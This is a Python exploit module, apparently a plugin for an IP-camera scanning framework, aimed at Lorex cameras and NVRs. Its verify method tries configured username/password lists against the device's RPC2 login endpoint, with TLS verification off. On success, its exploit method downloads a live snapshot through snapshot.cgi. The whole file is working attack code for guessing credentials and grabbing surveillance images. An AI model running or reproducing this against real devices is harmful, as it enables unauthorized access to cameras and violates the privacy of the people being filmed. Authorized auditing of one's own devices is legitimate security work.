import requests
from requests.auth import HTTPDigestAuth

from loguru import logger

from .base import POCTemplate


class LorexWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['lorex']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.medium
        self.desc = """Lorex cameras/NVRs with default credentials (admin/000000)"""

    def verify(self, ip, port=80):
        """Lorex devices use Dahua-based firmware with RPC2 login"""
        headers = {
            **self._get_headers(),
            'Host': ip,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        proxies = self._get_proxies()
        for user in self.config.users:
            for password in self.config.passwords:
                _json = {
                    "method": "global.login",
                    "params": {
                        "userName": user,
                        "password": password,
                        "clientType": "Web3.0",
                        "loginType": "Direct",
                        "authorityType": "Default",
                        "passwordType": "Plain",
                    },
                    "id": 1,
                    "session": 0,
                }
                try:
                    r = requests.post(
                        self._get_url(ip, port, '/RPC2_Login'),
                        headers=headers,
                        json=_json,
                        verify=False,
                        timeout=self.config.timeout,
                        proxies=proxies
                    )
                    if r.status_code == 200 and r.json().get('result') == True:
                        return ip, str(port), self.product, str(user), str(password), self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
        url = self._get_url(ip, port, '/cgi-bin/snapshot.cgi')
        return self._snapshot(url, img_file_name, HTTPDigestAuth(user, password))


POCTemplate.register_poc(LorexWeakPassword)
